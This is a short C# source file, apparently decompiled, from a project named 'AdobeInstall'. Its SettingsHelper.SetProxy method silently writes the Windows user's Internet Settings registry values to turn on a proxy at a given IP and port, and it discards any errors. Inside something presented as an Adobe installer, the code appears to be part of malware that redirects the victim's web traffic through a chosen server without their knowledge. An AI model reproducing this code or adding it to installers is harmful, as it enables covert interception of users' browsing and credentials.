using System;
using System.Globalization;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace AdobeInstall;

public class SettingsHelper
{
	public static void SetProxy(string ip, int port)
	{
		RegistryKey registryKey = null;
		RegistryKey registryKey2 = null;
		try
		{
			registryKey = Registry.CurrentUser;
			registryKey2 = registryKey.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", writable: true);
			if (registryKey2 != null)
			{
				registryKey2.SetValue("ProxyServer", "http=" + ip + ":" + port.ToString(CultureInfo.InvariantCulture));
				registryKey2.SetValue("ProxyEnable", 1);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		finally
		{
			if (registryKey != null)
			{
				registryKey.Flush();
				registryKey.Close();
			}
			if (registryKey2 != null)
			{
				registryKey2.Flush();
				registryKey2.Close();
			}
		}
	}
}
